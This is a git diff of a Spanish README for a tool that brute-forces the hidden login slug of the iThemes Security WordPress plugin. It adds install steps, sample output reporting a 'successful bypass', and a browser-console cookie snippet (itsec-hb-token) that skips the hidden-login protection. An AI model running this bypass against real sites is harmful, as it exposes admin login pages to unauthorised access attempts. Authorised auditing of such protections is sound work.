@@ -25,14 +25,57 @@ Herramienta de detección y explotación de slugs ocultos generados por el plugi
 ## 🚀 Requisitos
 
 - Python 3.7+
-- Conexión a internet
 - Librerías:
   - `requests`
   - `beautifulsoup4`
   - `rich`
   - `pyfiglet`
 
-Instálalas con:
+## 📥 Instalación
+
+### 1. Clonar el repositorio
+
+```bash
+git clone https://github.com/AndreewNR/Bypass_iThemesSecurity.git
+cd Bypass_iThemesSecurity
+```
+
+### 2. Instalar dependencias
 
 ```bash
 pip install -r requirements.txt
+```
+
+## ⚙️ Uso
+
+Ejecuta la herramienta con:
+
+```bash
+python main.py
+```
+
+### 🧪 Ejemplo de uso
+
+[+] Ingresa la URL objetivo (sin / al final): https://tudominio.com
+
+🔍 Iniciando escaneo de slugs ocultos en: https://tudominio.com
+
+🔄 Probando slug: 6bcbbd3fc2
+🔄 Probando slug: loginadmin
+🔄 Probando slug: abc123...
+
+✅ ¡Bypass exitoso! Slug válido: loginadmin
+🔗 Accede directamente: https://tudominio.com/wp-login.php
+
+### 🍪 ¿Y si quieres probar el bypass manualmente?
+
+Puedes simular el bypass en el navegador usando cookies. Si la herramienta detecta un slug válido y entrega cookies, puedes abrir la consola de tu navegador (F12) y ejecutar:
+```bash
+document.cookie = "itsec-hb-token=loginadmin";
+window.location.href = "/wp-login.php";
+```
+
+###⚠️ Descargo de responsabilidad
+Esta herramienta es solo para fines educativos y auditorías autorizadas.
+El uso no ético o en sistemas sin permiso explícito podría violar leyes locales.
+`Autores y colaboradores no se hacen responsables del uso indebido de este software.`
